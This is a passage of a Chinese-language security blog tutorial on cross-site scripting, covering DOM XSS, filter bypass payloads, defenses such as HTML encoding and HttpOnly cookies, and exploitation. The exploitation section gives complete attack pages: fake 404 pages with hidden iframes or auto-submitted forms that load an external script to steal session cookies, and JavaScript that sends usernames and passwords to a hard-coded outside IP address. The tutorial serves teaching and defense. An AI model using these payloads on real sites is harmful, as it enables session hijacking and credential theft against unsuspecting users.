 print.innerHTML=text.value;  <span class="comment">// 获取 text的值，并且输出在print内。这里是导致xss的主要原因。</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里有一个用户提交的页面，用户可以在此提交数据，数据提交之后给后台处理</p>
+<p><img src="/img/security/xss/20180909075918515.png"></p>
+<p>我们可以输入 <code>&lt;img src=1 onerror=alert(&#39;hack&#39;)&gt;</code>，然后看看页面的变化</p>
+<p><img src="/img/security/xss/20180909080035608.png"></p>
+<p>页面直接弹出了 hack 的页面，可以看到，我们插入的语句已经被页面给执行了。  </p>
+<p>这就是DOM型XSS漏洞，这种漏洞数据流向是：<code>前端--&gt;浏览器</code></p>
+<h1 id="8、XSS的简单过滤和绕过"><a href="#8、XSS的简单过滤和绕过" class="headerlink" title="8、XSS的简单过滤和绕过"></a>8、XSS的简单过滤和绕过</h1><p>在面对 SQL 注入的时候，我们可以利用一些函数（如：<code>preg_replace()</code>），将组成sql语句的一些字符给过滤，以防止注入。那么，我们也可以用一些函数将构成 xss 代码的一些关键字符给过滤了。可是，道高一尺魔高一丈，虽然过滤了，但是还是可以进行过滤绕过，以达到XSS攻击的目的。</p>
+<h2 id="8-1、区分大小写过滤标签"><a href="#8-1、区分大小写过滤标签" class="headerlink" title="8.1、区分大小写过滤标签"></a>8.1、区分大小写过滤标签</h2><p>先放上源代码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">//前端 1.html：</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>反射型XSS<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"action4.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"name"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">//后端 action4.php：</span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$name=$_POST[<span class="string">"name"</span>]; </span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($name!=<span class="keyword">null</span>)&#123;</span></span><br><span class="line"><span class="php">  $name=preg_replace(<span class="string">"/&lt;script&gt;/"</span>,<span class="string">""</span>,$name);      <span class="comment">//过滤&lt;script&gt;</span></span></span><br><span class="line"><span class="php">  $name=preg_replace(<span class="string">"/&lt;\/script&gt;/"</span>,<span class="string">""</span>,$name);   <span class="comment">//过滤&lt;/script&gt;</span></span></span><br><span class="line"><span class="php">  <span class="keyword">echo</span> $name; </span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>绕过技巧：可以使用大小写绕过 <code>&lt;scripT&gt;alert(&#39;hack&#39;)&lt;/scripT&gt;</code></p>
+<h2 id="8-2、不区分大小写过滤标签"><a href="#8-2、不区分大小写过滤标签" class="headerlink" title="8.2、不区分大小写过滤标签"></a>8.2、不区分大小写过滤标签</h2><p>先放上源代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$name=preg_replace(<span class="string">"/&lt;script&gt;/i"</span>,<span class="string">""</span>,$name);    <span class="comment">//不区分大小写过滤 &lt;script&gt;</span></span><br><span class="line">$name=preg_replace(<span class="string">"/&lt;\/script&gt;/i"</span>,<span class="string">""</span>,$name);  <span class="comment">//不区分大小写过滤 &lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>绕过技巧：可以使用嵌套的script标签绕过<code>&lt;scr&lt;script&gt;ipt&gt;alert(&#39;hack&#39;)&lt;/scr&lt;/script&gt;ipt&gt;</code></p>
+<h2 id="8-3、不区分大小写，过滤之间的所有内容"><a href="#8-3、不区分大小写，过滤之间的所有内容" class="headerlink" title="8.3、不区分大小写，过滤之间的所有内容"></a>8.3、不区分大小写，过滤之间的所有内容</h2><p>先放上源代码</p>
+<p>这个和上面的代码一模一样，只不过是过滤的时候过滤条件发生了变化 </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$name = preg_replace( <span class="string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] ); <span class="comment">//过滤了&lt;script  及其之间的所有内容</span></span><br></pre></td></tr></table></figure>
+
+<p>虽然无法使用<script>标签注入XSS代码，但是可以通过img、body等标签的事件或者 iframe 等标签的 src 注入恶意的 js 代码。</p>
+<p>payload：<code>&lt;img src=1 onerror=alert(&#39;hack&#39;)&gt;</code></p>
+<h1 id="9、XSS的防御"><a href="#9、XSS的防御" class="headerlink" title="9、XSS的防御"></a>9、XSS的防御</h1><p>XSS防御的总体思路是：对用户的输入(和URL参数)进行过滤，对输出进行html编码。也就是对用户提交的所有内容进行过滤，对url中的参数进行过滤，过滤掉会导致脚本执行的相关内容；然后对动态输出到页面的内容进行html编码，使脚本无法在浏览器中执行</p>
+<ol>
+<li><p>内容过滤。对输入的内容进行过滤，可以分为黑名单过滤和白名单过滤。</p>
+<ul>
+<li>黑名单过滤虽然可以拦截大部分的XSS攻击，但是还是存在被绕过的风险。</li>
+<li>白名单过滤虽然可以基本杜绝XSS攻击，但是真实环境中一般是不能进行如此严格的白名单过滤的。</li>
+</ul>
+<p>对输出进行html编码，就是通过函数，将用户的输入的数据进行html编码，使其不能作为脚本运行。</p>
+<p>如下，是使用 php 中的 htmlspecialchars 函数对用户输入的 name 参数进行 html 编码，将其转换为 html 实体</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#使用htmlspecialchars函数对用户输入的name参数进行html编码，将其转换为html实体</span><br><span class="line">$name &#x3D; htmlspecialchars( $_GET[ &#39;name&#39; ] );</span><br></pre></td></tr></table></figure>
+
+<p>如下，图一是没有进行html编码的，图2是进行了html编码的。经过html编码后script标签被当成了html实体。 </p>
+<p><img src="/img/security/xss/120190128202918105.png"></p>
+<p><img src="/img/security/xss/20190128203026880.png"></p>
+</li>
+<li><p>设置http only属性。我们还可以服务端设置会话Cookie的HTTP Only属性，这样，客户端的JS脚本就不能获取Cookie信息了</p>
+</li>
+<li><p>明确输入内容。对用户输入的内容进行类型明确，比如个人信息电话或者邮箱地址等位置都过滤一些不符合的内容。</p>
+</li>
+<li><p>输入内容长度控制。对于不可信的内容都应该进行长度控制，比如控制电话号码的输入长度，这种防御主要是增加XSS攻击的难度。</p>
+</li>
+<li><p>客户端分层防御策略。客户端跨站脚本攻击的分层防御策略是基于独立分配线程和分层防御策略的安全模型，它建立在客户端（浏览器），这是它与其它模型最大的区别，客户端在接受服务器信息时，选择性执行相关的内容，这样就使防御XSS攻击变得更容易。</p>
+</li>
+</ol>
+<h1 id="10、反射型XSS的利用姿势"><a href="#10、反射型XSS的利用姿势" class="headerlink" title="10、反射型XSS的利用姿势"></a>10、反射型XSS的利用姿势</h1><p>我们现在发现一个网站存在反射型XSS，当用户登录该网站时，我们通过诱使用户点击我们精心制作的恶意链接，来盗取用户的Cookie并且发送给我们，然后我们再利用盗取的Cookie以用户的身份登录该用户的网站。</p>
+<h2 id="get型"><a href="#get型" class="headerlink" title="get型"></a>get型</h2><p>当我们输入参数的请求类型的get类型的，即我们输入的参数是以URL参数的形式。如下</p>
+<p>该链接为：<a href="http://127.0.0.1/vulnerabilities/xss_r/?name=" target="_blank" rel="noopener">http://127.0.0.1/vulnerabilities/xss_r/?name=</a><script>alert(/xss/)</script></p>
+<p>那么，我们要怎么构造恶意代码来诱使用户点击并且用户点击后不会发现点击了恶意链接呢？</p>
+<p>我们构造了如下代码，将其保存为html页面，然后放到我们自己的服务器上，做成一个链接。当用户登录了存在漏洞的网站，并且用户点击了我们构造的恶意链接时，该链接页面会偷偷打开iframe框架，iframe会访问其中的链接，然后执行我们的js代码。该js代码会把存在漏洞网站的cookie发送到我们的平台上，但是用户却浑然不知，他会发现打开的是一个404的页面！</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;vulnerabilities&#x2F;xss_r&#x2F;?name&#x3D;&lt;script src&#x3D;https:&#x2F;&#x2F;t.cn&#x2F;EtxZt8T&gt;&lt;&#x2F;script&gt;&quot; style&#x3D;&quot;display:none;&quot;&gt;&lt;&#x2F;iframe&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"IE=edge,chrome=1"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>404 页面不存在 <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span></span><br><span class="line"><span class="css">        <span class="selector-tag">body</span>&#123;<span class="attribute">font</span>:<span class="number">14px</span>/<span class="number">1.5</span> <span class="string">'Microsoft YaHei'</span>,<span class="string">'微软雅黑'</span>,Helvetica,Sans-serif;<span class="attribute">min-width</span>:<span class="number">1200px</span>;<span class="attribute">background</span>:<span class="number">#f0f1f3</span>;&#125;</span></span><br><span class="line"><span class="css">        <span class="selector-class">.error-page</span>&#123;<span class="attribute">background</span>:<span class="number">#f0f1f3</span>;<span class="attribute">padding</span>:<span class="number">80px</span> <span class="number">0</span> <span class="number">180px</span>&#125;</span></span><br><span class="line"><span class="css">        <span class="selector-class">.error-page-main</span>&#123;<span class="attribute">position</span>:relative;<span class="attribute">background</span>:<span class="number">#f9f9f9</span>;<span class="attribute">margin</span>:<span class="number">0</span> auto;<span class="attribute">width</span>:<span class="number">617px</span>;<span class="attribute">-ms-box-sizing</span>:border-box;<span class="attribute">-webkit-box-sizing</span>:border-box;<span class="attribute">-moz-box-sizing</span>:border-box;<span class="attribute">box-sizing</span>:border-box;<span class="attribute">padding</span>:<span class="number">50px</span> <span class="number">50px</span> <span class="number">70px</span>&#125;</span></span><br><span class="line"><span class="css">        <span class="selector-class">.error-page-main</span> <span class="selector-tag">h3</span>&#123;<span class="attribute">font-size</span>:<span class="number">24px</span>;<span class="attribute">font-weight</span>:<span class="number">400</span>;<span class="attribute">border-bottom</span>:<span class="number">1px</span> solid <span class="number">#d0d0d0</span>&#125;</span></span><br><span class="line"><span class="css">        <span class="selector-class">.error-page-main</span> <span class="selector-tag">h3</span> <span class="selector-tag">strong</span>&#123;<span class="attribute">font-size</span>:<span class="number">54px</span>;<span class="attribute">font-weight</span>:<span class="number">400</span>;<span class="attribute">margin-right</span>:<span class="number">20px</span>&#125;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://127.0.0.1/vulnerabilities/xss_r/?name=&lt;script src=https://t.cn/EtxZt8T&gt;&lt;/script&gt;"</span> <span class="attr">style</span>=<span class="string">"display:none;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"error-page"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"error-page-container"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"error-page-main"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h3</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">strong</span>&gt;</span>404<span class="tag">&lt;/<span class="name">strong</span>&gt;</span>很抱歉，您要访问的页面不存在！</span><br><span class="line">            <span class="tag">&lt;/<span class="name">h3</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>而我们的XSS平台将得到用户的Cookie，然后我们就可以利用得到的Cookie以用户的身份访问该网站了。</p>
+<p>注：我们的攻击代码可以利用的前提是存在XSS漏洞的网站的X-Frame-options未配置，并且会话Cookie没有设置Http Only属性</p>
+<h3 id="post型"><a href="#post型" class="headerlink" title="post型"></a>post型</h3><p>我们现在知道一个网站的用户名输入框存在反射型的XSS漏洞</p>
+<p>我们构造了如下代码，将其保存为html页面，然后放到我们自己的服务器上，做成一个链接。当用户登录了存在漏洞的网站，并且用户点击了我们构造的恶意链接时，该恶意链接的页面加载完后会执行js代码，完成表单的提交，表单的用户名参数是我们的恶意js代码。提交完该表单后，该js代码会把存在漏洞网站的cookie发送到我们的平台上，但是用户却浑然不知，他会发现打开的是一个404的页面。</p>
+<p>我们这里写了一个404页面，404页面中隐藏了一个form提交的表单，为了防止提交表单后跳转，我们在表单下加了一个iframe框架，并且iframe框架的name等于form表单的target，并且我们设置iframe框架为不可见。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"IE=edge,chrome=1"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>404 页面不存在 <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span></span><br><span class="line"><span class="css">        <span class="selector-tag">body</span>&#123;<span class="attribute">font</span>:<span class="number">14px</span>/<span class="number">1.5</span> <span class="string">'Microsoft YaHei'</span>,<span class="string">'微软雅黑'</span>,Helvetica,Sans-serif;<span class="attribute">min-width</span>:<span class="number">1200px</span>;<span class="attribute">background</span>:<span class="number">#f0f1f3</span>;&#125;</span></span><br><span class="line"><span class="css">        <span class="selector-class">.error-page</span>&#123;<span class="attribute">background</span>:<span class="number">#f0f1f3</span>;<span class="attribute">padding</span>:<span class="number">80px</span> <span class="number">0</span> <span class="number">180px</span>&#125;</span></span><br><span class="line"><span class="css">        <span class="selector-class">.error-page-main</span>&#123;<span class="attribute">position</span>:relative;<span class="attribute">background</span>:<span class="number">#f9f9f9</span>;<span class="attribute">margin</span>:<span class="number">0</span> auto;<span class="attribute">width</span>:<span class="number">617px</span>;<span class="attribute">-ms-box-sizing</span>:border-box;<span class="attribute">-webkit-box-sizing</span>:border-box;<span class="attribute">-moz-box-sizing</span>:border-box;<span class="attribute">box-sizing</span>:border-box;<span class="attribute">padding</span>:<span class="number">50px</span> <span class="number">50px</span> <span class="number">70px</span>&#125;</span></span><br><span class="line"><span class="css">        <span class="selector-class">.error-page-main</span> <span class="selector-tag">h3</span>&#123;<span class="attribute">font-size</span>:<span class="number">24px</span>;<span class="attribute">font-weight</span>:<span class="number">400</span>;<span class="attribute">border-bottom</span>:<span class="number">1px</span> solid <span class="number">#d0d0d0</span>&#125;</span></span><br><span class="line"><span class="css">        <span class="selector-class">.error-page-main</span> <span class="selector-tag">h3</span> <span class="selector-tag">strong</span>&#123;<span class="attribute">font-size</span>:<span class="number">54px</span>;<span class="attribute">font-weight</span>:<span class="number">400</span>;<span class="attribute">margin-right</span>:<span class="number">20px</span>&#125;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="function"><span class="keyword">function</span> <span class="title">attack</span><span class="params">()</span></span></span></span><br><span class="line">&#123;</span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.getElementById(<span class="string">"transfer"</span>).submit();</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"form.html"</span> <span class="attr">frameborder</span>=<span class="string">"0"</span> <span class="attr">style</span>=<span class="string">"display: none"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"error-page"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"error-page-container"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"error-page-main"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h3</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">strong</span>&gt;</span>404<span class="tag">&lt;/<span class="name">strong</span>&gt;</span>很抱歉，您要访问的页面不存在！</span><br><span class="line">            <span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">id</span>=<span class="string">"transfer"</span>  <span class="attr">action</span>=<span class="string">"http://127.0.0.1/xss/action.php"</span> <span class="attr">target</span>=<span class="string">"frameName"</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">value</span>=<span class="string">"&lt;script src=https://t.cn/EtxZt8T&gt;&lt;/script&gt;"</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">""</span> <span class="attr">frameborder</span>=<span class="string">"0"</span> <span class="attr">name</span>=<span class="string">"frameName"</span> <span class="attr">style</span>=<span class="string">"display: none"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>当用户点击了我们构造的恶意链接，发现打开的是一个404页面。实际上这个页面偷偷的进行了表单的提交。而我们的XSS平台也收到了发送来的数据。</p>
+<h1 id="11、利用JS将用户信息发送给后台"><a href="#11、利用JS将用户信息发送给后台" class="headerlink" title="11、利用JS将用户信息发送给后台"></a>11、利用JS将用户信息发送给后台</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.staticfile.org&#x2F;jquery&#x2F;1.10.2&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        $(function()&#123;</span><br><span class="line">            &#x2F;&#x2F;我们现在假如 user和pass是我们利用js获得的用户的用户名和密码</span><br><span class="line">            user&#x3D;&quot;admin&quot;;</span><br><span class="line">            pass&#x3D;&quot;root&quot;;</span><br><span class="line">            url&#x3D;&quot;http:&#x2F;&#x2F;120.79.74.249:8080&#x2F;?user&#x3D;&quot;+user+&quot;&amp;pass&#x3D;&quot;+pass;</span><br><span class="line">            var frame&#x3D;$(&quot;&lt;iframe&gt;&quot;);</span><br><span class="line">            frame.attr(&quot;src&quot;,url);</span><br><span class="line">            frame.attr(&quot;style&quot;,&quot;display:none&quot;);</span><br><span class="line">            $(&quot;#body&quot;).append(frame);      &#x2F;&#x2F;添加一个iframe框架，并设置不显示。这个框架会偷偷访问该链接。</span><br><span class="line">        &#125;);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body id&#x3D;&quot;body&quot;&gt;</span><br><span class="line">    &lt;h3&gt;hello,word!&lt;&#x2F;h3&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>当用户访问了该页面，我们后台就可以看到用户访问记录。</p>
+
+                
+                <hr>
+                <!-- Pager -->
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/081-security-漏洞-漏洞之-SQL-Injection（SQL-注入）/" data-toggle="tooltip" data-placement="top" title="漏洞之 SQL Injection（SQL 注入）">&larr; Previous Post</a>
+                    </li>
+                    
+                    
+                    <li class="next">
+                        <a href="/081-security-漏洞-漏洞之-reverse-shell-反弹shell/" data-toggle="tooltip" data-placement="top" title="漏洞之 reverse shell (反弹 shell)">Next Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+
+                <!-- tip start -->
+                
+
+                
+                <div class="comment_notes">
+                    <p>
+                        study well and make progress every day; study well and progress every day; study hard and make progress every day.
+                    </p>
+                </div>
+                
+                <!-- tip end -->
+
+                <!-- Music start-->
+                
+                <!-- Music end -->
+
+                <!-- Sharing -->
+                
+                <div class="social-share"  data-wechat-qrcode-helper="" align="center"></div>
+                <!--  css & js -->
+                <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+                <script src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+                
+                <!-- Sharing -->
+
+                <!-- gitment start -->
+                
+                <!-- gitment end -->
+
+                <!-- 来必力City版安装代码 -->
+                
+                <!-- City版安装代码已完成 -->
+
+                <!-- disqus comment start -->
+                
+                <!-- disqus comment end -->
+            </div>
+            
+            <!-- Tabe of Content -->
+            <!-- Table of Contents -->
+
+    
+      
+        <aside id="sidebar">
+          <div id="toc" class="toc-article">
+          <strong class="toc-title">Contents</strong>
+          
+            
+              <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#1、XSS的原理和分类"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">1、XSS的原理和分类</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#2、XSS的攻击载荷"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">2、XSS的攻击载荷</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#post型"><span class="toc-nav-number">2.0.1.</span> <span class="toc-nav-text">post型</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#11、利用JS将用户信息发送给后台"><span class="toc-nav-number">3.</span> <span class="toc-nav-text">11、利用JS将用户信息发送给后台</span></a></li></ol>
+            
+          
+          </div>
+        </aside>
+      
+    
+
+                
+            <!-- Sidebar Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#security" title="security">security</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="https://blog.csdn.net/fenglepeng" target="_blank">Feng Lepeng&#39;s CSDN</a></li>
+                    
+                </ul>
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
